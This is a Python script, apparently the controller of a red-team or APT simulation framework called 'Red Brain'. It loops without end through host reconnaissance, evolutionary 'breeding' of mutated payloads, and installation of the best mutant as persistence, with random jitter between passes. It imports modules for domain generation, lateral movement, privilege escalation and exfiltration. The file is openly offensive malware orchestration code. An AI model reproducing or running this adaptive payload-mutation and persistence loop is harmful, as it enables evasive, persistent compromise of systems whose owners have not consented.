#!/usr/bin/env python3
"""
Red Brain (Adaptive Attack Loop)
Sequence: Recon > Breed > Release > Recon > Repeat
"""

import time
import random
import logging
import platform
from threat_intel import ThreatIntel
from red_tools import (
    TrafficGenerator, DGA, PersistenceManager, LateralMover,
    PrivEsc, ExfiltrationEngine, SystemSurveyor, NetworkSniffer
)
from evolution import EvolutionLab
from db_manager import DatabaseManager
import config

logging.basicConfig(level=logging.INFO, format='%(asctime)s - [RED LOOP] - %(message)s')

class RedAPT:
    def __init__(self):
        self.db = DatabaseManager()
        self.ti = ThreatIntel()

        # Tools
        self.surveyor = SystemSurveyor()
        self.sniffer = NetworkSniffer()
        self.persist = PersistenceManager()
        self.lab = EvolutionLab() # Integrated Breeding Capability

        self.running = True
        self.target_os = "Unknown"

    def phase_recon(self):
        logging.info(">>> PHASE: RECONNAISSANCE")
        # 1. System Survey
        info = self.surveyor.collect_system_info()
        self.target_os = info.get("os", "Unknown")
        logging.info(f"Target OS Identified: {self.target_os}")

        # 2. Network Sniffing
        services = self.sniffer.scan_active_services()
        if services:
            logging.info(f"Services Found: {list(services.keys())}")

        self.db.log_event("RED", "RECON", f"OS: {self.target_os}")
        time.sleep(2)

    def phase_breed(self):
        logging.info(">>> PHASE: BREEDING (Adaptive)")
        # Adapt breeding to Target OS
        # If Linux -> Prefer Bash/Python
        # If Windows -> We would prefer PowerShell (not impl yet, defaulting to Python)

        # Trigger evolution
        logging.info(f"Breeding variants for {self.target_os}...")
        self.lab.run_generation(1) # Run a generation to get fresh mutants

        # Select the best mutant
        mutant_code = self.lab.population[0]
        # Calculate hash for logging
        import hashlib
        h = hashlib.sha256(mutant_code.encode()).hexdigest()

        logging.info(f"Bred 'Viral Baby' (Hash: {h[:8]}...)")
        self.db.log_event("RED", "BREED", f"Variant: {h}")
        return mutant_code

    def phase_release(self, payload):
        logging.info(">>> PHASE: RELEASE (Deploying to Weakness)")
        # Deploy the payload
        # In a real scenario, 'weakness' would be a specific exploit.
        # Here, the 'weakness' is the persistence access we have.

        success = self.persist.install_custom_payload(payload)
        if success:
            logging.info("Baby Released Successfully.")
            self.db.log_event("RED", "RELEASE", "Persistence Established")
        else:
            logging.error("Release Failed.")

    def run(self):
        logging.info("Red APT Initialized. Entering Adaptive Loop.")

        while self.running:
            try:
                # 1. RECON
                self.phase_recon()

                # 2. BREED
                viral_baby = self.phase_breed()

                # 3. RELEASE
                self.phase_release(viral_baby)

                # 4. REPEAT
                logging.info("Loop Complete. Evaluating satisfaction...")
                # Jitter before repeating
                wait = random.uniform(5.0, 10.0)
                logging.info(f"Sleeping {wait:.1f}s before next cycle...")
                time.sleep(wait)

            except KeyboardInterrupt:
                self.running = False
            except Exception as e:
                logging.error(f"Loop Error: {e}")
                time.sleep(1)

if __name__ == "__main__":
    apt = RedAPT()
    apt.run()
